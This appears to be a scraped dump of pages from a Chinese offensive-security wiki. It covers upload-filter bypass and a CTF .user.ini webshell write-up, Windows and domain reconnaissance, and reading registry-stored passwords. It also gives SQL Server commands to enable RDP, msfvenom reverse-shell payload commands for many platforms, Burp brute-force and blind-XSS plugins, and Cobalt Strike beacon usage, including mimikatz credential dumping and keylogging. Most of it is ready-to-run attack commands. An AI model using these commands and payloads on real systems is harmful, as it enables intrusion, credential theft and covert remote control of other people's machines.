filename=php.php;.jpg 前端限制绕过 1.使用BURP抓包修改后重放 2.或者使用浏览器中元素审查，修改允许或禁止上传文件类型。 下载绕过 远程下载文件绕过 文件包含绕过 上传图片木马 $x=$_GET['x']; include($x); 访问:http://www.xxxx.com/news.php?x=xxxxxx.jpg 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 10:21:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/上传绕过/1.html":{"url":"安全技术/上传绕过/1.html","title":"user.ini的利用","keywords":"","body":"user.ini的利用 前言 在前段时间SUCTF 2019的比赛中做了一道名为CheckIn的文件上传题，学到了一种新的利用姿势——.user.ini。 原题的链接已经失效了，但SU的师傅们把题目源码贴在GitHub上了（感谢师傅们！！），如果想尝试的话可以下载源码复现，在这里放一下地址： https://github.com/team-su/SUCTF-2019 CheckIn题目分析 首先我们来看一下题目，首页就是一个简单的上传界面： 我们先上传一个php文件试一下，显然是illegal的 经过fuzz发现修改content-type和利用特殊扩展名php5、pht等都没有成功（当然也不会这么简单233） 然后我们把扩展名改为aaa试一下会怎样，发现回显： 我们再把文件内容换一下，发现回显：exif_imagetype:not image!，猜测后端应该调用了php的exif_imagetype()函数，这个很好绕过，添加图片文件头就可以了 我们添加最简单的gif文件头GIF89a，发现上传成功（注意看该文件夹下还有一个index.php，当时没有注意，但在后面有大用处） 我们先来捋一下思路： -> 上传过滤为黑名单，但php脚本文件应该是无法上传的 -> 存在文件头过滤，需要添加图片文件的文件头 -> 文件的内容不能包含类型的图片马来绕过 既然是黑名单过滤而且可以上传图片马，那我们首先想到的肯定是传一个.htaccess上去来将图片马解析为php，而这种方法经过尝试发现失败了。。。 看了一下服务器是nginx 1.10.3，似乎版本较高，不存在解析漏洞。 随后在网上看到了一篇p牛的文章，讲的是利用.user.ini来上传php后门 .user.ini 我们先在php手册上看一下对.user.ini的介绍： 大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg); 这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效） 寻找突破getflag 看过.user.ini的分析后我们的思路应该比较清晰了，我们可以上传一个这样的.user.ini： GIF89a auto_prepend_file=a.jpg 此时我们注意到上传目录下还有一个index.php，我们正好需要该目录下有一个可执行php文件，那这简直暴露了考点就是.user.ini，看来这个思路应该是可行的 然后再上传一个这样的图片马a.jpg： GIF89a system('cat /flag'); 最后，我们访问http://192.168.177.152:9021/uploads/6683eb5bfa1174bd139499256f60b7ab/index.php 即可得到flag .user.ini实战利用的可能性 综上所述.user.ini的利用条件如下： 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache 但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。 但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测../，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini 除此之外，把.user.ini利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下.user.ini和我们的图片马，这样就达到了隐藏后门的目的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-20 18:19:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/基础网络命令.html":{"url":"安全技术/常用命令/基础网络命令.html","title":"基础网络命令","keywords":"","body":"基本网络命令 ipconfig/all 查看IP地址 whoami 查询账号所属权限 whoami/all 查看sid值 systeminfo 查询系统以及补丁信息 tasklist /svc 查看进程 taskkill /im 进程名称(cmd) 结束进程 taskkill /pid [进程码] -t(结束该进程) -f(强制结束该进程和子进程) wmic qfe get hotfixid 查看已安装过得补丁 wmic qfe list full /format:htable > hotfixid.html 详细的补丁安装 ping hostname(主机名） 显示该机器名的IP net start 查看当前运行的服务 net user 查看本地组的用户 net session 查看当前会话 net share 查看SMB指向的路径 net use \\\\IP\\ipc$ password /user:username 建立IPC会话 wmic share get name,path 查看SMB指向的路径 wmic nteventlog get path,filename,writeable 查询系统日志文件存储位置 net use \\\\IP\\ipc$ password /user:username 建立IPC会话 netstat -ano 查看开放的端口 netstat -an | find “3389” 找到3389端口 net accounts 查看本地密码策略 nbtstat –A ip netbiso查询 net view 查看机器注释 echo %PROCESSOR_ARCHITECTURE% 查看系统是32还是64位 set 查看系统环境设置变量 net start 查看当前运行的服务 wmic service list brief 查看进程服务 wmic process list brief 查看进程 wmic startup list brief 查看启动程序信息 wmic product list brief 查看安装程序和版本信息 wmic startup list full 识别开机启动的程序 wmic product > pro.txt 查看安装软件以及版本路径等信息，输出到pro.txt if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) 查看是否支持posershell qwinsta 查看登录情况 REG query HKCU /v \"pwd\" /s 查看保存在注册表中的密码 for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i\"ttl\" 批量扫描内网存活主机（192.168.1.内网IP段） 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 17:13:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/路由常用命令.html":{"url":"安全技术/常用命令/路由常用命令.html","title":"上路由常用命令","keywords":"","body":"路由查询常用命令 tracert IP 路由跟踪 route print 打印路由表 arp -a 列出本网段内所有活跃的IP地址 arp -s （ip + mac） 绑定mac与ip地址 arp -d （ip + mac） 解绑mac与ip地址 netsh firewall show config 查看防火墙策略 netsh firewall show state 查看防火墙策略 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 16:37:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/域操作命令.html":{"url":"安全技术/常用命令/域操作命令.html","title":"域操作命令","keywords":"","body":"域操作基础命令 net group /domain 获得所有域用户组列表 net group xxxxx /domain 显示域中xxxxx组的成员 net group xxxxx /del /domain 删除域中xxxxx组 net group xxxxx xy /del /domain 删除域内xxxxx 群组中的xy成员 net group xxxxx /add /domain 增加域中的群组 net group \"domain admins\" /domain 获得域管理员列表 net group \"enterprise admins\" /domain 获得企业管理员列表 net localgroup administrators /domain 获取域内置administrators组用（enterprise admins、domain admins） net group \"domain controllers\" /domain 获得域控制器列表 net group \"domain computers\" /domain 获得所有域成员计算机列表 net user /domain 获得所有域用户列表 net user xxxx /domain 获得指定账户xxxx的详细信息 net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息 net view /domain 查询有几个域, 查询域列表 net view /domain:xxxx 查看 xxxx域中的计算机列表 nltest /domain_trusts 获取域信任信息 net user domain-admin /domain 查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息 net config Workstation 查询机器属于哪个域 net time /domian 查询主域服务器的时间 echo %logonserver% 查看登陆到这台服务器的计算机名 gpupdate/force 更新域策略 tasklist /S ip /U domain\\username /P /V 查看远程计算机进程列 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 16:38:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/Dos快捷命令.html":{"url":"安全技术/常用命令/Dos快捷命令.html","title":"Dos快捷命令","keywords":"","body":"DOS快捷命令 mspaint 画图工具 calc 计算器 notepad 记事本 taskmgr 任务管理器 osk 打开屏幕键盘 gpedit.msc 组策略 services.msc 本地服务 compmgmt.msc 计算机管理 devmgmt.msc 设备管理器 winver 查看系统版本 magnify 放大镜实用程序 eventvwr 事件查看器 Regedit 打开注册表 resmon 资源监视器 WMIC BIOS get releasedate 查看电脑生产日期 mstsc -f 远程连接 copy 路径\\文件名 路径\\文件名 复制文件 move 路径\\文件名 路径\\文件名 移动文件 del 文件名 删除文件（不能删除文件夹） 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 17:09:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/windows端口转发.html":{"url":"安全技术/常用命令/windows端口转发.html","title":"Windows端口转发","keywords":"","body":"windows端口转发 netsh interface ipv6 install 首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！） netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22 //将本机22到1.1.1.1的22 netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22 netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=百度一下，你就知道 connectport=22 netsh interface portproxy show all 查看转发配置 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22 删除配置 netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all 添加防火墙规则，允许连接22： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 21:33:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/sql server常用操作远程桌面命令.html":{"url":"安全技术/常用命令/sql server常用操作远程桌面命令.html","title":"sql server常用操作远程桌面命令","keywords":"","body":"1.是否开启远程桌面，1表示关闭，0表示开启 EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server' ,'fDenyTSConnections' 2.读取远程桌面端口 EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp','PortNumber' 3.开启远程桌面 EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',0; reg文件开启远程桌面： Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]\"fDenyTSConnections\"=dword:00000000[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]\"PortNumber\"=dword:00000d3d //// 保存micropoor.reg，并执行regedit /s micropoor.reg 注：如果第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。 netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow 4.关闭远程桌面 EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',1; Micropoor 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 23:17:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/msfvenom常用生成payload命令.html":{"url":"安全技术/常用命令/msfvenom常用生成payload命令.html","title":"msfvenom常用生成payload命令","keywords":"","body":"windows: msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o payload.exe mac: msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho android: //需要签名 msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f apk -o payload.apk powershell: msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1 linux: msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf php: msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php aspx: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx jsp: msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻 击机端口 -f raw -o payload.jsp war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war nodejs: msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js python: msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 - f raw -o payload.py perl: msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl ruby: msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb lua: msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua windows shellcode: msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -f c linux shellcode: msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f c mac shellcode: msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c 补充说明 便捷化payload生成： 项目地址：https://github.com/Screetsec/TheFatRat root@John:~/Desktop# git clone https://github.com/Screetsec/TheFatRat.git //设置时需要挂墙 附录： 中文使用说明： Options: -p, --payload 使用指定的payload --payload-options 列出该payload参数 -l, --list [type] 列出所有的payloads -n, --nopsled 为payload指定一个 nopsled 长度 -f, --format 指定payload生成格式 --help-formats 查看所有支持格式 -e, --encoder 使用编码器 -a, --arch 指定payload构架 --platform 指定payload平台 --help-platforms 显示支持的平台 -s, --space 设定payload攻击荷载的最大长度 --encoder-space The maximum size of the encoded payload (defaults to the -s value) -b, --bad-chars 指定bad-chars 如: '\\x00\\xff' -i, --iterations 指定编码次数 -c, --add-code 指定个win32 shellcode 文件 -x, --template 指定一个 executable 文件作为模板 -k, --keep payload自动分离并注入到新的进程 -o, --out 存放生成的payload -v, --var-name 指定自定义变量 --smallest Generate the smallest possible payload -h, --help 显示帮助文件 Micropoor 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-07 00:33:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/powershell基础命令.html":{"url":"安全技术/常用命令/powershell基础命令.html","title":"Powershell基础命令","keywords":"","body":"powershell递归寻址注册表 $key = Get-Item HKLM:\\Software\\Microsoft\\PowerShell\\1 $key.Name HKEY_LOCAL_MACHINE\\Software\\Microsoft\\PowerShell\\1 $key | Format-List ps* 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 00:21:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/powershell常用命令.html":{"url":"安全技术/常用命令/powershell常用命令.html","title":"Powershell常用命令","keywords":"","body":"Powershell常用命令 get-host或$host.version或$PSVersionTable.PSVERSION 查看powershell版本 New-Item test -type Directory 新建目录 New-Item test -type File 新建文件 Remove-Item 文件或目录 删除文件或目录 get-content 1.txt 显示文本内容 set-content 1.txt -value \"helloword\" 设置文件内容 add-content 1.txt -value \"love\" 追加文本内容 Get-ExecutionPolicy 查看powershell执行策略 Set-ExecutionPolicy Unrestricted 设置powershell执行策略 Restricted 为脚本不能运行，是默认设置 Unrestricted 为允许所有的脚本运行 RemoteSigned 为只能运行本地创建的脚本，不能运行从网上下载的脚本，除了有数字签名证书 Allsigned 为只运行有受信任的发布者签名的脚本 get-process 获取所有进程 Set-Alias 例如Set-Alias aaa get-process 给命令起别名 Get-Command 查看当前作用域支持的所有命令 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 00:23:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/powershell注册表操作.html":{"url":"安全技术/常用命令/powershell注册表操作.html","title":"Powershell注册表操作","keywords":"","body":"注册表操作命令 Get-PSProvider 获取安装的提供程序列表 Dir, Get-ChildItem 列出键的内容 Cd, Set-Location 更改当前（键）目录 HKCU:, HKLM: 预定义的两个重要注册表根目录虚拟驱动器 Get-ItemProperty 读取键的值 Set-ItemProperty 设置键的值 New-ItemProperty 给键创建一个新值 Clear-ItemProperty 删除键的值内容 Remove-ItemProperty 删除键的值 New-Item, md 创建一个新键 Remove-Item, Del 删除一个键 Test-Path 验证键是否存在 Get-PSDrive -PSProvider Registry 查看那些注册表驱动器已经被注册表提供程序使用 New-PSDrive job1 registry \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\" dir job1: 自由地创建任何额外的驱动器 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 00:21:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"安全技术/常用命令/powershell操作注册表权限.html":{"url":"安全技术/常用命令/powershell操作注册表权限.html","title":"Powershell操作注册表权限","keywords":"","body":"powershell操作注册表权限 Get-Acl 查看键的当前权限 $acl = Get-Acl HKCU:\\Software\\Testkey $acl.Owner mosser $me = [System.Security.Principal.NTAccount]\"$env:userdomain\\$env:username\" $acl.SetOwner($me) 接管一个注册表键（先有权限访问）的所有权限 del HKCU:\\Software\\Testkey2 md HKCU:\\Software\\Testkey2 $acl = Get-Acl HKCU:\\Software\\Testkey2 $person = [System.Security.Principal.NTAccount]\"Administrators\" $access = [System.Security.AccessControl.RegistryRights]\"FullControl\" $inheritance = [System.Security.AccessControl.InheritanceFlags]` \"ObjectInherit,ContainerInherit\" $propagation = [System.Security.AccessControl.PropagationFlags]\"None\" $type = [System.Security.AccessControl.AccessControlType]\"Allow\" $rule = New-Object System.Security.AccessControl.RegistryAccessRule( ` $person,$access,$inheritance,$propagation,$type) $acl.ResetAccessRule($rule) $person = [System.Security.Principal.NTAccount]\"Everyone\" $access = [System.Security.AccessControl.RegistryRights]\"ReadKey\" $inheritance = [System.Security.AccessControl.InheritanceFlags]` \"ObjectInherit,ContainerInherit\" $propagation = [System.Security.AccessControl.PropagationFlags]\"None\" $type = [System.Security.AccessControl.AccessControlType]\"Allow\" $rule = New-Object System.Security.AccessControl.RegistryAccessRule( ` $person,$access,$inheritance,$propagation,$type) $acl.ResetAccessRule($rule) Set-Acl HKCU:\\Software\\Testkey2 $acl 管理员拥有更改权限普通用户只有读取的新键的权限 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 00:20:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Burpsuite/1.html":{"url":"Tools/Burpsuite/1.html","title":"Burpsuite 伪造ip爆破脚本","keywords":"","body":"Burpsuit 伪造ip爆破脚本 https://github.com/ianxtianxt/burpsuiefakeip BurpFakeIP 四个小功能 伪造指定ip 伪造本地ip 伪造随机ip 随机ip爆破 0x01 伪造指定ip 在Repeater模块右键选择fakeIp菜单,然后点击inputIP功能,然后输入指定的ip 程序会自动添加所有可伪造得字段到请求头中。 0x02 伪造本地ip 在Repeater模块右键选择fakeIp菜单,然后点击127.0.0.1功能： 0x03 伪造随机ip 在Repeater模块右键选择fakeIp菜单,然后点击randomIP功能： 0x04 随机ip爆破 伪造随机ip爆破是本插件最核心的功能。 将数据包发送到Intruder模块,在Positions中切换Attack type为Pitchfork模式,选择好有效的伪造字段,以及需要爆破的字段: 按照箭头顺序将Payload来源设置为Extensin-generated,并设置负载伪fakeIpPayloads,然后设置第二个变量。 点击Start attack开始爆破. 如上图,实现每次爆破都使用不同的伪ip进行,避免被ban。 PS：伪造随机ip爆破的先决条件可以伪造ip绕过服务器限制。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-10 20:49:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Burpsuite/2.html":{"url":"Tools/Burpsuite/2.html","title":"Burpsuite 自动化blind-xss插件","keywords":"","body":"Burpsuite 自动化blind-xss插件 https://github.com/ianxtianxt/Automated-blind-xss-search-for-Burp-Suite 安装 Git clone https://github.com/ianxtianxt/Automated-blind-xss-search-for-Burp-Suite.git Burp -> Extender -> Add -> find and select blind-xss.py 如何使用 首先，在名为“Your URL”的字段中设置回调URL，然后按Enter将其自动保存在config.py文件中。 设置好之后，您需要用OOB-XSS向量填充Payloads表，以便扩展程序能够将您的Payloads注入到传出的请求中。请注意，您需要在Payloads中设置{URL}别名，因此扩展名将能够从“Your url”字段中获取数据并将其直接设置为Payloads。 Femida是随机驱动的扩展，因此在主动或被动扫描期间，将在行“Active”中使用带有“ 1”的每个Payloads。因此，如果要从测试中排除任何Payloads或参数/标头，只需将“Active”值更改为0。 Payloads 使用'上传'或'添加'按钮将Payloads添加到表中。 不要忘记有效载荷中的{URL}参数。 当您将任何数据添加到表中时，活动行将手动等于1.（现在表示其活动状态） 如果要使其不活动-将活动行设置为0 Headers & Parameters 您可以使用添加按钮或在 Target/Proxy/Repeater 中单击鼠标右键手动添加数据。 headers 和 parameters 不区分大小写。 如果要使其不活动-将活动行设置为0。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-25 23:11:32 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/1.html":{"url":"Tools/Cobalt Strike/1.html","title":"Cobalt Strike 安装说明","keywords":"","body":"Cobalt Strike 安装说明 安装 Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。 服务端 服务端关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行： 安装java环境 sudo apt install default-jre 赋权 chmod +x teamserver 安装screen apt-get install screen 输入 screen 在新窗口执行我们需要执行的命令 ./teamserver ip pass 按下组合键Ctrl a d关闭窗口并后台执行 screen -ls 查看后台会话 screen -ls 重新进入会话窗口 客户端 客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置。 在控制台所有操作指令都会被记录保留在Cobalt Strike目录logs下。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 01:11:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/2.html":{"url":"Tools/Cobalt Strike/2.html","title":"Cobalt Strike 参数翻译","keywords":"","body":"Cobalt Strike 参数翻译 主界面参数 Cobalt Strike New Connection #新的连接(支持连接多个服务器端) Preferences #偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等) Visualization #窗口视图模式(展示输出结果的形式) VPN Interfaces #VPN接入 Listenrs #监听器(创建Listener) Script Manager #脚本管理 Close #关闭 View Applications #应用(显示受害者机器的应用信息) Credentials #凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里) Downloads #下载文件 Event Log #事件日志(主机上线记录以及团队协作聊天记录) Keystrokes #键盘记录 Proxy Pivots #代理模块 Screenshots #截图 Script Console #脚本控制台(可以加载各种脚本，增强功能https://github.com/rsmudge/cortana-scripts) Targets #显示目标主机 Web Log #Web日志 Attacks Packages HTML Application #生成恶意的HTA木马文件 MS Office Macro #生成office宏病毒文件 Payload Generator #生成各种语言版本的payload USB/CD AutoPlay #生成利用自动播放运行的木马文件 Windows Dropper #捆绑器，能够对文档类进行捆绑 Windows Executable #生成可执行Payload Windows Executable(S) #把包含payload,Stageless生成可执行文件(包含多数功能) Web Drive-by Manage #对开启的web服务进行管理 Clone Site #克隆网站(可记录受害者提交的数据) Host File #提供Web以供下载某文件 Scripted Web Delivery #提供Web服务，便于下载和执行PowerShell Payload，类似于Metasploit的web_delivery Signed Applet Attack #启动一个Web服务以提供自签名Java Applet的运行环境 Smart Applet Attack #自动检测Java版本并利用已知的exploits绕过security System Profiler #用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等 Reporting 0. Activity report #活动报告 1. Hosts report #主机报告 2. Indicators of Compromise #威胁报告 3. Sessions report #会话报告 4. Social engineering report #社会工程学报告 5. Tactics, Techniques, and Procedures #策略、技巧和程序 Reset Data #重置数据 Export Data #导出数据 Help Homepage #官方主页 Support #技术支持 Arsenal #开发者 System information #版本信息 About #关于 右键菜单参数 Access Dump Hashes #获取hash Elevate #提权 Golden Ticket #生成黄金票据注入当前会话 Make token #凭证转换 Run Mimikatz #运行 Mimikatz Spawn As #用其他用户生成Cobalt Strike侦听器 Explore Browser Pivot #劫持目标浏览器进程 Desktop(VNC) #桌面交互 File Browser #文件浏览器 Net View #命令Net View Port Scan #端口扫描 Process List #进程列表 Screenshot #截图 Pivoting SOCKS Server #代理服务 Listener #反向端口转发 Deploy VPN #部署VPN Spawn 外部监听器(如指派给MSF，获取meterpreter权限) Session Note #备注 Remove #删除 Sleep #指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。实际中频率不宜过快,容易被发现。 Exit #退出 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-26 23:20:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/30.html":{"url":"Tools/Cobalt Strike/30.html","title":"Cobalt Strike Beacon 基础信息搜集","keywords":"","body":"Cobalt Strike Beacon 基础信息搜集 getuid 查看当前 shell 权限,如下可以看到,当前是以系统内建的 administrator 用户权限在操作 ps 查看当前系统进程列表 [ 默认它已经事先把 64 位和 32 进程区分清楚了,这也是为什么不去用系统自带的 tasklist 工具的原因,比如,后面某些功能就需要你明确指明目标进程是 32 还是 64 位的 ] kill 3292 杀掉指定 id 的进程,比如,杀掉这个记事本进程 shell query user 执行 win 系统的各种原生 cmd 命令,命令参数正常带上执行即可 shell mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" shell 也可以用来执行自己上传的一些 命令行程序,比如,mimikatz.exe 执行完之后它会把执行的结果再回显回来 execute mimikatz.exe \"log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" 跟 shell 功能有所不同,同样都是执行指定命令行程序,但 shell 会把执行结果回显回来,而 execute 则不会,至于到底执行成功没,还需要用其它方式来判断 特别注意这个截屏功能,因为我们现在是在正常的 administrator 用户权限下操作的[标准用户环境],所以,通过 explorer.exe 就直接能截取到目标桌面,如果你当前是在 system 权限下则必须先把自己降权或切换到一个正常的正在线系统用户权限上,这样才能正常截到目标桌面 screenshot x64 2656 1 对用户桌面进行截屏 keylogger 2656 x64 常规键盘记录,同样还是指定 explorer.exe 进程进行截获 如下,我们看到中文显示乱码了,很正常,因为我们用的这个 CobaltStrike,几乎是原生的默认也没有调整编码,所以,不用太在意,后期等整个系列全部更新完,视情况也许会给大家一个调整好的用 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-29 22:44:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/Cobalt Strike/31.html":{"url":"Tools/Cobalt Strike/31.html","title":"Cobalt Strike Beacon 基础文件管理","keywords":"","body":"Cobalt Strike Beacon 基础文件管理 pwd 查看当前所在路径 cd c:\\windows\\help\\help 切换到指定路径下 ls 查看当前目录下的所有文件和目录 mkdir tmp 在当前目录下新建一个名为 tmp 的目录 rm tmp 删除当前目录下的 tmp 目录,注意,删除指定目录时,不能有进程占用该目录,否则是删不掉的 upload /home/klion/Desktop/systmd.exe 上传 systmd.exe 到当前目录下,貌似只能上传单个文件,其实,平时也压根用不着一次性上传很多东西 download c:\\windows\\temp\\backup.zip 下载目标系统中指定路径下的指定文件,此处要特别注意,它并不是直接就下到你本地机器上的,而是先上传到团队服务器,之后需要我们再从团队服务器选中指定文件然后再同步到你本地的 downloads 用于查看当前正在往本地同步的文件,没啥用 看到上面提示下载完成之后,点击菜单中的选中要同步的\"view\" -> \"Download\"然后再选中你要下载的文件,点击\"Sync Files\" 指明你要保存到的本地路径,即可开始下载,全部下载完成后它依然会提示你,非常简单就不多废话了 drives 列出当前系统中的所有盘符 # cp c:\\windows\\temp\\backup.zip c:\\windows\\help\\help\\res.zip 复制指定的文件到指定路径下,注意后面的目标路径务必要指定保存为的文件名 # mv c:\\windows\\temp\\backup.zip c:\\windows\\help\\help\\source.zip 移动指定的文件到指定路径下,注意后面的目标路径务必要指定保存为的文件名 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 